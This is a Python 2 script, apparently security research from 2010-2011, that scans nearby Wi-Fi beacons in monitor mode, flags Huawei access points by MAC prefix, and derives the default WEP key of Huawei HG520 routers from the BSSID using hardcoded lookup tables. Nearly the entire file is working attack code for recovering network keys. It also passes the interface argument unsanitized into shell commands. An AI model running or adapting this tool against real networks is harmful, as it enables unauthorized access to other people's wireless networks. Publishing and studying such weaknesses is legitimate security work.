#!/usr/bin/env python
# mac2wepkey Huawei HG520 by Humberto Ochoa <hochoa@websec.mx> - 12/2010
# mac2wepkey Scanner by Paulino Calderon <calderon@websec.mx> - 1/2011
# Notas:
# -Correr como root
# Requerimientos:
# -scapy-python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys
from scapy.all import *
import os

def hex2dec(s):
   return int(s, 16)

def isHuawei(mac):
	#if you know more huawei mac addr ranges please send them to me =)
	HuaweiMacs=['000fe2','001882','001e10','0022a1','002568','00259e','00e0fc','286ed4','6416f0','781dba','5c4ca9','202bc1','285fdb','308730','404d8e','4c5499','54a51b','f4c714']
	if mac[0:6] in HuaweiMacs:
		return True
	else:
		return False

def printDefaultKey(macAddr):
	i=0;mac=[]
	a0=0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
	a1=0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
	a2=0,13,10,7,5,8,15,2,10,7,0,13,15,2,5,8
	a3=0,1,3,2,7,6,4,5,15,14,12,13,8,9,11,10
	a4=0,5,11,14,7,2,12,9,15,10,4,1,8,13,3,6
	a5=0,4,8,12,0,4,8,12,0,4,8,12,0,4,8,12
	a6=0,1,3,2,6,7,5,4,12,13,15,14,10,11,9,8
	a7=0,8,0,8,1,9,1,9,2,10,2,10,3,11,3,11
	a8=0,5,11,14,6,3,13,8,12,9,7,2,10,15,1,4
	a9=0,9,2,11,5,12,7,14,10,3,8,1,15,6,13,4
	a10=0,14,13,3,11,5,6,8,6,8,11,5,13,3,0,14
	a11=0,12,8,4,1,13,9,5,2,14,10,6,3,15,11,7
	a12=0,4,9,13,2,6,11,15,4,0,13,9,6,2,15,11
	a13=0,8,1,9,3,11,2,10,6,14,7,15,5,13,4,12
	a14=0,1,3,2,7,6,4,5,14,15,13,12,9,8,10,11
	a15=0,1,3,2,6,7,5,4,13,12,14,15,11,10,8,9
	n1=0,14,10,4,8,6,2,12,0,14,10,4,8,6,2,12
	n2=0,8,0,8,3,11,3,11,6,14,6,14,5,13,5,13
	n3=0,0,3,3,2,2,1,1,4,4,7,7,6,6,5,5
	n4=0,11,12,7,15,4,3,8,14,5,2,9,1,10,13,6
	n5=0,5,1,4,6,3,7,2,12,9,13,8,10,15,11,14
	n6=0,14,4,10,11,5,15,1,6,8,2,12,13,3,9,7
	n7=0,9,0,9,5,12,5,12,10,3,10,3,15,6,15,6
	n8=0,5,11,14,2,7,9,12,12,9,7,2,14,11,5,0
	n9=0,0,0,0,4,4,4,4,0,0,0,0,4,4,4,4
	n10=0,8,1,9,3,11,2,10,5,13,4,12,6,14,7,15
	n11=0,14,13,3,9,7,4,10,6,8,11,5,15,1,2,12
	n12=0,13,10,7,4,9,14,3,10,7,0,13,14,3,4,9
	n13=0,1,3,2,6,7,5,4,15,14,12,13,9,8,10,11
	n14=0,1,3,2,4,5,7,6,12,13,15,14,8,9,11,10
	n15=0,6,12,10,9,15,5,3,2,4,14,8,11,13,7,1
	n16=0,11,6,13,13,6,11,0,11,0,13,6,6,13,0,11
	n17=0,12,8,4,1,13,9,5,3,15,11,7,2,14,10,6
	n18=0,12,9,5,2,14,11,7,5,9,12,0,7,11,14,2
	n19=0,6,13,11,10,12,7,1,5,3,8,14,15,9,2,4
	n20=0,9,3,10,7,14,4,13,14,7,13,4,9,0,10,3
	n21=0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15
	n22=0,1,2,3,5,4,7,6,11,10,9,8,14,15,12,13
	n23=0,7,15,8,14,9,1,6,12,11,3,4,2,5,13,10
	n24=0,5,10,15,4,1,14,11,8,13,2,7,12,9,6,3
	n25=0,11,6,13,13,6,11,0,10,1,12,7,7,12,1,10
	n26=0,13,10,7,4,9,14,3,8,5,2,15,12,1,6,11
	n27=0,4,9,13,2,6,11,15,5,1,12,8,7,3,14,10
	n28=0,14,12,2,8,6,4,10,0,14,12,2,8,6,4,10
	n29=0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3
	n30=0,15,14,1,12,3,2,13,8,7,6,9,4,11,10,5
	n31=0,10,4,14,9,3,13,7,2,8,6,12,11,1,15,5
	n32=0,10,5,15,11,1,14,4,6,12,3,9,13,7,8,2
	n33=0,4,9,13,3,7,10,14,7,3,14,10,4,0,13,9
	key=30,31,32,33,34,35,36,37,38,39,61,62,63,64,65,66
	ssid=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']
	while i<12:
		mac.insert(i,hex2dec(macAddr[i]));i=i+1

	ya=(a2[mac[0]])^(n11[mac[1]])^(a7[mac[2]])^(a8[mac[3]])^(a14[mac[4]])^(a5[mac[5]])^(a5[mac[6]])^(a2[mac[7]])^(a0[mac[8]])^(a1[mac[9]])^(a15[mac[10]])^(a0[mac[11]])^13
	yb=(n5[mac[0]])^(n12[mac[1]])^(a5[mac[2]])^(a7[mac[3]])^(a2[mac[4]])^(a14[mac[5]])^(a1[mac[6]])^(a5[mac[7]])^(a0[mac[8]])^(a0[mac[9]])^(n31[mac[10]])^(a15[mac[11]])^4
	yc=(a3[mac[0]])^(a5[mac[1]])^(a2[mac[2]])^(a10[mac[3]])^(a7[mac[4]])^(a8[mac[5]])^(a14[mac[6]])^(a5[mac[7]])^(a5[mac[8]])^(a2[mac[9]])^(a0[mac[10]])^(a1[mac[11]])^7
	yd=(n6[mac[0]])^(n13[mac[1]])^(a8[mac[2]])^(a2[mac[3]])^(a5[mac[4]])^(a7[mac[5]])^(a2[mac[6]])^(a14[mac[7]])^(a1[mac[8]])^(a5[mac[9]])^(a0[mac[10]])^(a0[mac[11]])^14
	ye=(n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]])^(a7[mac[6]])^(a8[mac[7]])^(a14[mac[8]])^(a5[mac[9]])^(a5[mac[10]])^(a2[mac[11]])^7
 
	defaultKey=str(key[ya])+str(key[yb])+str(key[yc])+str(key[yd])+str(key[ye])
	return defaultKey

def sniffBeaconPacket(p):	
	if p.haslayer(Dot11Beacon):
		if aplist.count(p.addr2) == 0:
			aplist.append(p.addr2)
			macStr=p.addr2.replace(":","")
			if isHuawei(macStr):
				print "Posible AP Huawei -> %s MAC:[%s] Default key:[%s]" % (p.info, p.addr2, printDefaultKey(macStr))
				
def printBanner():
	print " __  __            ____                     _"              
	print "|  \/  | __ _  ___|___ \__      _____ _ __ | | _____ _   _ "
	print "| |\/| |/ _` |/ __| __) \ \ /\ / / _ \ '_ \| |/ / _ \ | | |"
	print "| |  | | (_| | (__ / __/ \ V  V /  __/ |_) |   <  __/ |_| |"
	print "|_|  |_|\__,_|\___|_____| \_/\_/ \___| .__/|_|\_\___|\__, |"
	print "                                     |_|             |___/ "
	print " ____               "                   
	print "/ ___|  ___ __ _ _ __  _ __   ___ _ __ "
	print "\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|"
	print " ___) | (_| (_| | | | | | | |  __/ |   "
	print "|____/ \___\__,_|_| |_|_| |_|\___|_|   "
	print ""
	print "Mac2wepkey por Humberto Ochoa <hochoa@websec.mx>"                                    
	print "Scanner por Paulino Calderon <calderon@websec.mx>"
	print ""
	
def usage():
	printBanner()
	print "Uso: #python " +sys.argv[0] + " <interface>"
	print ""

if len(sys.argv) != 2:
	usage()
	exit()

interface = sys.argv[1]    
aplist = []
printBanner()
print "Poniendo en modo monitor..."
os.system("iwconfig %s mode monitor" % interface)
print "Escaneando..."
for chan in range(1,11):
	print "Escaneando canal #%d..." % chan
	os.system("iwconfig %s channel %d" % (interface, chan))
	sniff(iface=interface,prn=sniffBeaconPacket,count=25,timeout=3)
print "Scan completo"
print "Saliendo de modo monitor..."
os.system("iwconfig %s mode managed" % interface)

